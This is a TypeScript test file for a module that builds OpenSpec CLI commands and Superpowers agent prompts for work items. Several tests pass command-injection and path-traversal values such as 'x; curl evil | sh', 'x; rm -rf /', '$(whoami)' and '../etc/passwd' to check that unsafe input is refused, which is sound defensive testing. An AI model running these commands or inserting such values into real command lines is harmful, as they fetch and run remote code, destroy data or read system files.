import { assert, test } from 'orca/testing'
import { OPENSPEC_COMMANDS, type OpenspecCommand } from './action-catalog'
import type { Action } from './model'
import {
  CHANGE_ID_PLACEHOLDER,
  actionsForItem,
  findAction,
  frameworkActions,
  needsChangeId,
  resolvePaletteAction
} from './actions'

const item = {
  topic: 'add-x',
  openspec: {
    changeId: 'add-x',
    stage: 'implementing' as const,
    hasProposal: true,
    hasDesign: true,
    hasTasks: true,
    tasksDone: 1,
    tasksInProgress: 0,
    tasksTotal: 2,
    capabilities: []
  },
  superpowers: {
    designSpec: 'docs/superpowers/specs/x-design.md',
    plan: 'docs/superpowers/plans/x.md',
    stage: 'executing' as const,
    planDone: 1,
    planInProgress: 0,
    planTotal: 2
  }
}

const openspecOnly = { topic: 'add-x', openspec: item.openspec, superpowers: null }
const superpowersOnly = { topic: 'add-x', openspec: null, superpowers: item.superpowers }

const promptOf = (action: Action): string => {
  if (action.run.kind !== 'agent') {
    throw new Error(`action ${action.id} does not run an agent prompt`)
  }
  return action.run.prompt
}

test('runs OpenSpec commands in a terminal when the CLI is there', () => {
  const actions = actionsForItem(item, true)
  const validate = findAction(actions, 'openspec.validate')!
  assert.deepEqual(validate.run, { kind: 'terminal', command: 'openspec validate add-x --strict' })
  assert.equal(validate.mutates, false)
  assert.equal(findAction(actions, 'openspec.archive')?.mutates, true)
})

test('falls back to the agent form when the host has no CLI', () => {
  const actions = actionsForItem(item, false)
  for (const action of actions.filter((a) => a.framework === 'openspec')) {
    assert.equal(action.run.kind, 'agent', action.id)
    assert.match((action.run as { prompt: string }).prompt, /openspec\/AGENTS\.md/)
  }
})

test('Superpowers actions are always dispatched to an agent', () => {
  const actions = actionsForItem(item, true)
  const plan = findAction(actions, 'superpowers.plan')!
  assert.equal(plan.run.kind, 'agent')
  assert.match((plan.run as { prompt: string }).prompt, /superpowers:writing-plans/)
  assert.equal(plan.mutates, true)
})

test('omits OpenSpec actions for an item with no change', () => {
  const actions = actionsForItem(
    { topic: 'add-x', openspec: null, superpowers: item.superpowers },
    true
  )
  assert.equal(actions.filter((a) => a.framework === 'openspec').length, 0)
  assert.ok(actions.length > 0)
})

test('the framework palette lists both frameworks', () => {
  const palette = frameworkActions(false)
  assert.ok(palette.openspec.length >= 4)
  assert.ok(palette.superpowers.length >= 5)
  assert.ok(palette.openspec.every((action) => action.run.kind === 'agent'))
})

test('an item offers the commands of its change and the skills of its work', () => {
  assert.deepEqual(
    actionsForItem(item, true).map((action) => action.id),
    [
      'openspec.validate',
      'openspec.show',
      'openspec.archive',
      'superpowers.brainstorm',
      'superpowers.plan',
      'superpowers.execute',
      'superpowers.review',
      'superpowers.verify'
    ]
  )
})

test('an item with only a change offers only the OpenSpec commands', () => {
  assert.deepEqual(
    actionsForItem(openspecOnly, true).map((action) => action.id),
    ['openspec.validate', 'openspec.show', 'openspec.archive']
  )
})

test('an item with only Superpowers work offers only the Superpowers skills', () => {
  assert.deepEqual(
    actionsForItem(superpowersOnly, true).map((action) => action.id),
    [
      'superpowers.brainstorm',
      'superpowers.plan',
      'superpowers.execute',
      'superpowers.review',
      'superpowers.verify'
    ]
  )
})

test('an item with neither side offers nothing', () => {
  assert.deepEqual(actionsForItem({ topic: 'add-x', openspec: null, superpowers: null }, true), [])
})

test('every action carries the label, the framework and the mutates flag of its row', () => {
  assert.deepEqual(
    actionsForItem(item, true).map((action) => [
      action.id,
      action.label,
      action.framework,
      action.mutates
    ]),
    [
      ['openspec.validate', '校验', 'openspec', false],
      ['openspec.show', '看增量', 'openspec', false],
      ['openspec.archive', '归档', 'openspec', true],
      ['superpowers.brainstorm', '设计', 'superpowers', true],
      ['superpowers.plan', '写实施计划', 'superpowers', true],
      ['superpowers.execute', '执行计划', 'superpowers', true],
      ['superpowers.review', '代码评审', 'superpowers', false],
      ['superpowers.verify', '验证完成', 'superpowers', false]
    ]
  )
})

test('every change-scoped OpenSpec command has a command of its own', () => {
  // Why: the panel marks a card `无 CLI` when one of its OpenSpec actions runs no command. A
  // change-scoped command that only ever had an agent form would put that badge on cards of
  // projects that do have the CLI, and nothing else would notice.
  for (const command of OPENSPEC_COMMANDS.filter((entry) => entry.scope === 'change')) {
    assert.notEqual(command.command, null, `${command.id} has no command of its own`)
  }
})

test('the OpenSpec commands are the ones the CLI actually has', () => {
  assert.deepEqual(
    actionsForItem(item, true)
      .filter((action) => action.framework === 'openspec')
      .map((action) => action.run),
    [
      { kind: 'terminal', command: 'openspec validate add-x --strict' },
      { kind: 'terminal', command: 'openspec show add-x --json --deltas-only' },
      { kind: 'terminal', command: 'openspec archive add-x --yes' }
    ]
  )
})

test("an item's commands name its own change, not the placeholder", () => {
  const actions = actionsForItem(item, true)
  assert.equal(
    actions.some((action) => JSON.stringify(action.run).includes('<change-id>')),
    false
  )
})

test('the agent fallback names the guide and the change it acts on', () => {
  const actions = actionsForItem(item, false).filter((action) => action.framework === 'openspec')
  assert.deepEqual(
    actions.map((action) => action.id),
    ['openspec.validate', 'openspec.show', 'openspec.archive']
  )
  for (const action of actions) {
    const prompt = promptOf(action)
    assert.match(prompt, /openspec\/AGENTS\.md/, action.id)
    assert.match(prompt, /add-x/, action.id)
  }
})

test('every Superpowers prompt names the skill it dispatches', () => {
  const skills: Record<string, string> = {
    'superpowers.brainstorm': 'superpowers:brainstorming',
    'superpowers.plan': 'superpowers:writing-plans',
    'superpowers.execute': 'superpowers:executing-plans',
    'superpowers.review': 'superpowers:requesting-code-review',
    'superpowers.verify': 'superpowers:verification-before-completion'
  }
  for (const action of actionsForItem(item, true).filter((a) => a.framework === 'superpowers')) {
    assert.match(promptOf(action), new RegExp(skills[action.id]!), action.id)
    assert.equal(action.run.kind, 'agent', action.id)
  }
})

test('the Superpowers prompts name the artifacts they work on', () => {
  const actions = actionsForItem(item, true)
  assert.match(
    promptOf(findAction(actions, 'superpowers.plan')!),
    /docs\/superpowers\/specs\/x-design\.md/
  )
  assert.match(
    promptOf(findAction(actions, 'superpowers.execute')!),
    /docs\/superpowers\/plans\/x\.md/
  )
})

test('a Superpowers skill with no artifact yet asks for the generic one', () => {
  const actions = actionsForItem(
    {
      topic: 'add-x',
      openspec: null,
      superpowers: { ...item.superpowers, designSpec: null, plan: null }
    },
    true
  )
  assert.match(promptOf(findAction(actions, 'superpowers.plan')!), /设计 spec/)
  assert.match(promptOf(findAction(actions, 'superpowers.execute')!), /实施计划/)
})

test('the palette lists every command of both frameworks', () => {
  const palette = frameworkActions(false)
  assert.deepEqual(
    palette.openspec.map((action) => action.id),
    [
      'openspec.list',
      'openspec.validate',
      'openspec.show',
      'openspec.archive',
      'openspec.propose'
    ]
  )
  assert.deepEqual(
    palette.superpowers.map((action) => action.id),
    [
      'superpowers.brainstorm',
      'superpowers.plan',
      'superpowers.execute',
      'superpowers.review',
      'superpowers.verify'
    ]
  )
})

test('the palette runs the CLI where there is one and leaves the proposal to the agent', () => {
  const palette = frameworkActions(true)
  assert.deepEqual(
    palette.openspec.slice(0, 4).map((action) => action.run),
    [
      { kind: 'terminal', command: 'openspec list' },
      { kind: 'terminal', command: 'openspec validate <change-id> --strict' },
      { kind: 'terminal', command: 'openspec show <change-id> --json --deltas-only' },
      { kind: 'terminal', command: 'openspec archive <change-id> --yes' }
    ]
  )
  assert.equal(palette.openspec[4]!.run.kind, 'agent')
  assert.match(promptOf(palette.openspec[4]!), /openspec\/AGENTS\.md/)
})

test('the palette grades every command with the mutates flag of its row', () => {
  const palette = frameworkActions(false)
  assert.deepEqual(
    palette.openspec.map((action) => [action.id, action.mutates]),
    [
      ['openspec.list', false],
      ['openspec.validate', false],
      ['openspec.show', false],
      ['openspec.archive', true],
      ['openspec.propose', true]
    ]
  )
  assert.deepEqual(
    palette.superpowers.map((action) => [action.id, action.mutates]),
    [
      ['superpowers.brainstorm', true],
      ['superpowers.plan', true],
      ['superpowers.execute', true],
      ['superpowers.review', false],
      ['superpowers.verify', false]
    ]
  )
})

test('the palette falls back to the agent for every OpenSpec command', () => {
  const palette = frameworkActions(false)
  for (const action of palette.openspec) {
    assert.equal(action.run.kind, 'agent', action.id)
    assert.match(promptOf(action), /openspec\/AGENTS\.md/, action.id)
  }
})

test('every action id the design lists exists', () => {
  const palette = frameworkActions(false)
  assert.deepEqual(
    [...palette.openspec, ...palette.superpowers].map((action) => action.id).sort(),
    [
      'openspec.archive',
      'openspec.list',
      'openspec.propose',
      'openspec.show',
      'openspec.validate',
      'superpowers.brainstorm',
      'superpowers.execute',
      'superpowers.plan',
      'superpowers.review',
      'superpowers.verify'
    ]
  )
})

test('an unknown action id is not found', () => {
  assert.equal(findAction(actionsForItem(item, true), 'openspec.nope'), null)
  assert.equal(findAction([], 'superpowers.plan'), null)
})

test('the Superpowers prompt names the topic of the work, not the change id', () => {
  const actions = actionsForItem(
    { ...item, topic: 'feature-two', openspec: { ...item.openspec, changeId: 'add-x' } },
    true
  )
  const brainstorm = promptOf(findAction(actions, 'superpowers.brainstorm')!)
  assert.match(brainstorm, /为 feature-two 产出设计 spec/)
  assert.equal(brainstorm.includes('add-x'), false)
})

test('an unsafe change id leaves the item with no OpenSpec action', () => {
  const actions = actionsForItem(
    {
      topic: 'add-x',
      openspec: { ...item.openspec, changeId: 'x; curl evil | sh' },
      superpowers: item.superpowers
    },
    true
  )
  assert.deepEqual(
    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
    []
  )
  assert.ok(actions.some((action) => action.framework === 'superpowers'))
})

test('an unsafe change id leaves the item with no OpenSpec action in the agent form either', () => {
  const actions = actionsForItem(
    {
      topic: 'add-x',
      openspec: { ...item.openspec, changeId: 'x; curl evil | sh' },
      superpowers: item.superpowers
    },
    false
  )
  assert.deepEqual(
    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
    []
  )
})

test('a change id that could be read as an option is refused', () => {
  const actions = actionsForItem(
    { topic: 'add-x', openspec: { ...item.openspec, changeId: '--help' }, superpowers: null },
    true
  )
  assert.deepEqual(actions, [])
})

test('no command line ever carries an unsafe change id', () => {
  for (const changeId of ['x; rm -rf /', 'a b', '$(whoami)', '`id`', '../escape', 'a|b']) {
    const actions = actionsForItem(
      { topic: 'add-x', openspec: { ...item.openspec, changeId }, superpowers: null },
      true
    )
    assert.deepEqual(actions, [], changeId)
  }
})

test('an unsafe topic falls back to the generic label', () => {
  const actions = actionsForItem({ ...item, topic: 'x; rm -rf /' }, true)
  const brainstorm = promptOf(findAction(actions, 'superpowers.brainstorm')!)
  assert.match(brainstorm, /为 这个工作项 产出设计 spec/)
  assert.equal(brainstorm.includes('rm -rf'), false)
})

test('an unsafe spec path falls back to the generic label', () => {
  const actions = actionsForItem(
    { ...item, superpowers: { ...item.superpowers, designSpec: 'docs/; rm -rf /' } },
    true
  )
  const plan = promptOf(findAction(actions, 'superpowers.plan')!)
  assert.match(plan, /基于 设计 spec 写实施计划/)
  assert.equal(plan.includes('rm -rf'), false)
})

test('a path segment that walks up the tree is refused', () => {
  const actions = actionsForItem(
    { ...item, superpowers: { ...item.superpowers, plan: '../etc/passwd' } },
    true
  )
  const execute = promptOf(findAction(actions, 'superpowers.execute')!)
  assert.match(execute, /执行 实施计划/)
  assert.equal(execute.includes('passwd'), false)
})

test('an empty artifact path falls back to the generic label', () => {
  const actions = actionsForItem(
    { ...item, superpowers: { ...item.superpowers, designSpec: '', plan: '' } },
    true
  )
  assert.match(
    promptOf(findAction(actions, 'superpowers.plan')!),
    /基于 设计 spec 写实施计划/
  )
  assert.match(promptOf(findAction(actions, 'superpowers.execute')!), /执行 实施计划/)
})

test('an absolute artifact path is allowed', () => {
  const actions = actionsForItem(
    {
      ...item,
      superpowers: { ...item.superpowers, designSpec: '/abs/specs/x-design.md' }
    },
    true
  )
  assert.match(
    promptOf(findAction(actions, 'superpowers.plan')!),
    /基于 \/abs\/specs\/x-design\.md 写实施计划/
  )
})

test('an archived change is not offered the archive command', () => {
  const actions = actionsForItem(
    { ...item, openspec: { ...item.openspec, stage: 'archived' } },
    true
  )
  assert.deepEqual(
    actions.map((action) => action.id),
    [
      'openspec.validate',
      'openspec.show',
      'superpowers.brainstorm',
      'superpowers.plan',
      'superpowers.execute',
      'superpowers.review',
      'superpowers.verify'
    ]
  )
})

test("the palette's agent prompt still carries the placeholder", () => {
  const palette = frameworkActions(false)
  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
  assert.match(promptOf(validate), /<change-id>/)
})

test('a change id that is the placeholder itself gets no OpenSpec action', () => {
  // A throw here would fail the test: one bad directory must not blank the whole board.
  const actions = actionsForItem(
    {
      topic: 'add-x',
      openspec: { ...item.openspec, changeId: '<change-id>' },
      superpowers: item.superpowers
    },
    true
  )
  assert.deepEqual(
    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
    []
  )
  assert.ok(actions.some((action) => action.framework === 'superpowers'))
})

test('a change id that is the placeholder itself gets no OpenSpec action in the agent form', () => {
  const actions = actionsForItem(
    {
      topic: 'add-x',
      openspec: { ...item.openspec, changeId: '<change-id>' },
      superpowers: item.superpowers
    },
    false
  )
  assert.deepEqual(
    actions.filter((action) => action.framework === 'openspec').map((action) => action.id),
    []
  )
})

test("the palette's placeholder is exempt by provenance, not by content", () => {
  const palette = frameworkActions(true)
  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
  assert.deepEqual(validate.run, {
    kind: 'terminal',
    command: 'openspec validate <change-id> --strict'
  })
  const resolved = resolvePaletteAction(validate, 'add-x')
  assert.equal(resolved.ok, true)
  assert.deepEqual(resolved.ok && resolved.action.run, {
    kind: 'terminal',
    command: 'openspec validate add-x --strict'
  })
})

test('a palette command with no change id needs one', () => {
  const palette = frameworkActions(true)
  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
  assert.deepEqual(resolvePaletteAction(validate, undefined), {
    ok: false,
    reason: 'needs-change-id'
  })
})

test('a palette command with an unsafe change id is refused', () => {
  const palette = frameworkActions(true)
  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
  assert.deepEqual(resolvePaletteAction(validate, 'x; rm -rf /'), {
    ok: false,
    reason: 'unsafe-change-id'
  })
})

test('a palette command with a safe change id resolves to a runnable command', () => {
  const palette = frameworkActions(true)
  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
  const resolved = resolvePaletteAction(validate, 'add-x')
  assert.equal(resolved.ok, true)
  assert.deepEqual(resolved.ok && resolved.action.run, {
    kind: 'terminal',
    command: 'openspec validate add-x --strict'
  })
})

test("the palette's agent form resolves the change id too", () => {
  const palette = frameworkActions(false)
  const validate = palette.openspec.find((action) => action.id === 'openspec.validate')!
  const resolved = resolvePaletteAction(validate, 'add-x')
  assert.equal(resolved.ok, true)
  const prompt = resolved.ok ? promptOf(resolved.action) : ''
  assert.match(prompt, /严格校验变更 add-x/)
  assert.equal(prompt.includes('<change-id>'), false)
})

test('a project-scoped palette action resolves to itself', () => {
  const palette = frameworkActions(true)
  const list = palette.openspec.find((action) => action.id === 'openspec.list')!
  assert.deepEqual(resolvePaletteAction(list, undefined), { ok: true, action: list })
})

test('a project-scoped palette action ignores the change id', () => {
  const palette = frameworkActions(true)
  const list = palette.openspec.find((action) => action.id === 'openspec.list')!
  assert.deepEqual(resolvePaletteAction(list, 'x; rm -rf /'), { ok: true, action: list })
})

test('the scope of an action is the scope of the command it came from', () => {
  const palette = frameworkActions(true)
  assert.deepEqual(
    palette.openspec.map((action) => [action.id, action.scope]),
    [
      ['openspec.list', 'project'],
      ['openspec.validate', 'change'],
      ['openspec.show', 'change'],
      ['openspec.archive', 'change'],
      ['openspec.propose', 'project']
    ]
  )
  // Superpowers has no command that acts on one change: a skill acts on the project.
  assert.deepEqual(
    palette.superpowers.map((action) => action.scope),
    ['project', 'project', 'project', 'project', 'project']
  )
  // The item's own actions carry it too.
  assert.deepEqual(
    actionsForItem(item, true).map((action) => action.scope),
    ['change', 'change', 'change', 'project', 'project', 'project', 'project', 'project']
  )
})

/**
 * The invariant, as a predicate: a change-scoped command names the change in every form it
 * has. The task an agent is asked to do always names it; a command line, when the CLI has one,
 * names it too — otherwise the change would have nowhere to go.
 */
function namesTheChange(command: OpenspecCommand): boolean {
  if (!command.task.includes(CHANGE_ID_PLACEHOLDER)) {
    return false
  }
  return command.command === null || command.command.includes(CHANGE_ID_PLACEHOLDER)
}

test('every change-scoped command names the change it acts on', () => {
  // The scope says the command acts on a change, so every form it has must name it.
  for (const command of OPENSPEC_COMMANDS.filter((entry) => entry.scope === 'change')) {
    assert.equal(namesTheChange(command), true, command.id)
  }
})

test('a change-scoped command needs no command line of its own', () => {
  // An agent-only command names the change in its task, and that is enough: there is no
  // command line for the change to go into.
  assert.equal(
    namesTheChange({
      id: 'openspec.example',
      label: '示例',
      mutates: false,
      scope: 'change',
      command: null,
      task: '严格校验变更 <change-id>'
    }),
    true
  )
  // One with nowhere to put the change is caught.
  assert.equal(
    namesTheChange({
      id: 'openspec.example',
      label: '示例',
      mutates: false,
      scope: 'change',
      command: 'openspec example',
      task: '严格校验变更 <change-id>'
    }),
    false
  )
  // One whose task names no change is caught: the agent would never be told which change.
  assert.equal(
    namesTheChange({
      id: 'openspec.example',
      label: '示例',
      mutates: false,
      scope: 'change',
      command: 'openspec validate <change-id> --strict',
      task: '严格校验变更'
    }),
    false
  )
})

test('the scope decides, not the text of the run', () => {
  // A project-scoped action whose text mentions the change needs no change id.
  const project: Action = {
    id: 'openspec.list',
    label: '列出变更',
    framework: 'openspec',
    run: { kind: 'terminal', command: 'openspec list <change-id>' },
    mutates: false,
    scope: 'project'
  }
  assert.equal(needsChangeId(project), false)
  assert.deepEqual(resolvePaletteAction(project, undefined), { ok: true, action: project })
  // A change-scoped action needs one even when its text does not name it.
  const change: Action = {
    id: 'openspec.validate',
    label: '校验',
    framework: 'openspec',
    run: { kind: 'terminal', command: 'openspec validate --strict' },
    mutates: false,
    scope: 'change'
  }
  assert.equal(needsChangeId(change), true)
  assert.deepEqual(resolvePaletteAction(change, undefined), {
    ok: false,
    reason: 'needs-change-id'
  })
})
